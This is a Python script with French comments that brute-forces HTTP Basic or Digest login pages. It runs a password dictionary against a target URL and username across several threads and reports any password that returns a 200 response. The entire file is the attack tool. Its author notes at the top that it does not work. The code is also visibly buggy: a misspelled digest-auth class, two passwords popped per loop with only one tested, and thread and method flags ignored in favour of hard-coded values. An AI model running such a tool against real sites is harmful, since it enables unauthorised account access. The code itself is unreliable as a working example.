#!/usr/bin/python3

#mache pas du tout, j'ai toujours 0 comme status code alors qu'il a pas trouve le mdp

import requests
from threading import Thread
import sys
import time
import getopt
from requests.auth import HTTPDigestAuth

global hit
hit = "1"



def banner():
	print('''
   		    ***********************************
		    | BASE OR DIGEST BRUTEFORCE AUTH  |
		    ***********************************''')


def usage():
	print("Usage: ")
	print("		-w: url (http://randowmwebsite.com)")
	print("		-u: username")
	print("		-t: threads")
	print("		-f: dictionnary file")
	print("		-m: method (basic or digest)")
	print("Example: baseordigestauth.py -w http://randomwebsite.com -u admin -t 5 -f passwords.txt -m method")
	print("")


class request_performer(Thread):
	def __init__(self,passwd,user,url,method):
		print(passwd)
		Thread.__init__(self)
		self.password = passwd.split('\n')[0]
		self.username = user
		self.url = url
		self.method = method
		print("-" + self.password + "-")

	def run(self):
		global hit
		if hit == "1":
			try:
				if self.method == "basic":
					r = requests.get(self.url, auth=(self.username, self.password))
					print("status code")
					print(r.status_code)
				elif self.method == "digest":
					r = requests.get(self.url, auth=HTTpDigestAuth(self.username, self.password))
				if r.status_code == 200: #c'est qu'on a trouve le mdp
					hit = "0"
					print("[+] password found - " + self.password)
					sys.exit()
				else:
					print("[!!] Not valid password: " + self.password)
					i[0] = i[0] - 1 #on remove le thread
			except Exception as e:
				print(e)


def start(argv):
	banner()
	if len(sys.argv) < 5:
		usage()
		sys.exit()
	try:
		opts, args = getopt.getopt(argv, "u:w:f:m:t")
	except getopt.GetoptError:
		print("[!!] Error on arguments !")
		sys.exit()

	for opt, arg in opts:
		if opt == '-u':
			user = arg
		elif opt == '-w':
			url = arg
		elif opt == '-f':
			dictionnary = arg
		elif opt == '-m':
			method = arg
			print(method)
		elif opt == '-t':
			threads = arg
			print(threads)

	try:
		f = open(dictionnary, 'r')
		passwords = f.readlines()
	except:
		print("[!!] File doesn't exist, please check if the path is correct !")
		sys.exit()

	launcher_threads(passwords,5,user,url,"basic")

def launcher_threads(passwords,th,username,url,method): #fonction qui va gerer les threads
	global i
	i = []
	i.append(0)
	while len(passwords): #tant qu'on est pas a la fin du fichier
		if hit == "1": #juste un flag
			try:
				if i[0] < th:
					#passwd = passwords.pop(0)
					print(passwords.pop(0))
					i[0] = i[0]+1 #on va ajouter un thread pour keep a track de ce threead
					thread = request_performer(passwords.pop(0), username, url, method)
					thread.start()
			except KeyboardInterrupt:
				print("[!!] Interrupted !")
				sys.exit()
			thread.join()


if __name__ == "__main__":
	try:
		print(sys.argv[1:])
		start(sys.argv[1:]) #on run la fonction avec les arg
	except KeyboardInterrupt:
		print("[!!] Interrupted !")








